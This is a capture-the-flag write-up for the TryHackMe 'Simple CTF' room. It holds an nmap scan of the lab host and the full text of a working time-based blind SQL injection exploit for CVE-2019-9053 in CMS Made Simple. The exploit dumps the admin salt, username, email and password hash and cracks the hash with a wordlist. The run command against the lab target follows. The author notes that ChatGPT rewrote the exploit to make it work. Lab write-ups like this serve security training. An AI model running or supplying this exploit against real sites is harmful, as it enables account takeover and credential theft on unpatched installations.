# Simple CTF

Beginner level ctf

![User avatar](https://tryhackme.com/static/image/avatar.ed43cc90.png)

45 min

https://tryhackme.com/room/easyctf

[Notes](https://www.notion.so/Notes-2b7ae662683580979e1bda229e192d90?pvs=21)

![image.png](screenshots/1-HowManyServicesPort1000.png)

```bash
nmap -p 1-1000 simplectf.thm -sV -T5 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 20:51 EST
Nmap scan report for simplectf.thm (10.64.135.113)
Host is up (0.028s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.60 seconds
```

![image.png](screenshots/2-WhatsThePassword.png)

- To find the password we had to use the [SQL cms exploit](https://www.exploit-db.com/exploits/46635). The script didn’t work right on! ChatGPT rewrote the script and it worked!

```bash
#!/usr/bin/env python3
# Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# CVE-2019-9053

import requests
from termcolor import colored, cprint
import time
import optparse
import hashlib

# ---------- Options ----------
parser = optparse.OptionParser()
parser.add_option('-u', '--url',
                  action="store", dest="url",
                  help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist',
                  action="store", dest="wordlist",
                  help="Wordlist for crack admin password")
parser.add_option('-c', '--crack',
                  action="store_true", dest="cracking",
                  help="Crack password with wordlist", default=False)

options, args = parser.parse_args()

if not options.url:
    print("[+] Specify an url target")
    print("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
    print("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
    print("[+] Setup the variable TIME with an appropriate time, because this SQL injection is time based.")
    exit(1)

# ---------- Globals ----------
url_vuln = options.url.rstrip('/') + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
TIME = 1  # à ajuster si besoin (latence)
db_name = ""
output = ""
email = ""
salt = ''

wordlist = ""
if options.wordlist:
    wordlist = options.wordlist

# ---------- Helpers ----------
def crack_password():
    global password, output, wordlist, salt
    if not wordlist:
        output += "\n[!] No wordlist provided, cannot crack password."
        return

    try:
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                beautify_print_try(line)
                # md5 en Python 3 attend des bytes
                if hashlib.md5((salt + line).encode()).hexdigest() == password:
                    output += "\n[+] Password cracked: " + line
                    break
    except FileNotFoundError:
        output += "\n[!] Wordlist file not found: " + wordlist

def beautify_print_try(value):
    global output
    print("\033c")
    cprint(output, 'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])

def beautify_print():
    global output
    print("\033c")
    cprint(output, 'green', attrs=['bold'])

def dump_salt():
    global flag, salt, output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for ch in dictionary:
            temp_salt = salt + ch
            ord_salt_temp = ord_salt + format(ord(ch), 'x')
            beautify_print_try(temp_salt)

            payload = (
                "a,b,1,5))+and+(select+sleep(" + str(TIME) +
                ")+from+cms_siteprefs+where+sitepref_value+like+0x" +
                ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            )
            url = url_vuln + "&m1_idlist=" + payload

            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time

            if elapsed_time >= TIME:
                flag = True
                break

        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp

    flag = True
    output.append if isinstance(output, list) else None
    output_str = '\n[+] Salt for password found: ' + salt
    output += '\n[+] Salt for password found: ' + salt

def dump_password():
    global flag, password, output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for ch in dictionary:
            temp_password = password + ch
            ord_password_temp = ord_password + format(ord(ch), 'x')
            beautify_print_try(temp_password)

            payload = (
                "a,b,1,5))+and+(select+sleep(" + str(TIME) +
                ")+from+cms_users+where+password+like+0x" +
                ord_password_temp + "25+and+user_id+like+0x31)+--+"
            )
            url = url_vuln + "&m1_idlist=" + payload

            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time

            if elapsed_time >= TIME:
                flag = True
                break

        if flag:
            password = temp_password
            ord_password = ord_password_temp

    flag = True
    output += '\n[+] Password found: ' + password

def dump_username():
    global flag, db_name, output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for ch in dictionary:
            temp_db_name = db_name + ch
            ord_db_name_temp = ord_db_name + format(ord(ch), 'x')
            beautify_print_try(temp_db_name)

            payload = (
                "a,b,1,5))+and+(select+sleep(" + str(TIME) +
                ")+from+cms_users+where+username+like+0x" +
                ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            )
            url = url_vuln + "&m1_idlist=" + payload

            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time

            if elapsed_time >= TIME:
                flag = True
                break

        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp

    output += '\n[+] Username found: ' + db_name
    flag = True

def dump_email():
    global flag, email, output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for ch in dictionary:
            temp_email = email + ch
            ord_email_temp = ord_email + format(ord(ch), 'x')
            beautify_print_try(temp_email)

            payload = (
                "a,b,1,5))+and+(select+sleep(" + str(TIME) +
                ")+from+cms_users+where+email+like+0x" +
                ord_email_temp + "25+and+user_id+like+0x31)+--+"
            )
            url = url_vuln + "&m1_idlist=" + payload

            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time

            if elapsed_time >= TIME:
                flag = True
                break

        if flag:
            email = temp_email
            ord_email = ord_email_temp

    output += '\n[+] Email found: ' + email
    flag = True

# ---------- Main ----------
dump_salt()
dump_username()
dump_email()
dump_password()

if options.cracking:
    print(colored("[*] Now try to crack password", 'yellow'))
    crack_password()

beautify_print()

```

- We ran the command to crack the password :

```bash
python3 cmsexploit.py -u http://simplectf.thm/simple -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best110.txt -c
```

![image.png](screenshots/3-RoomAnswers.png)

![image.png](screenshots/4-RoomAnswers.png)
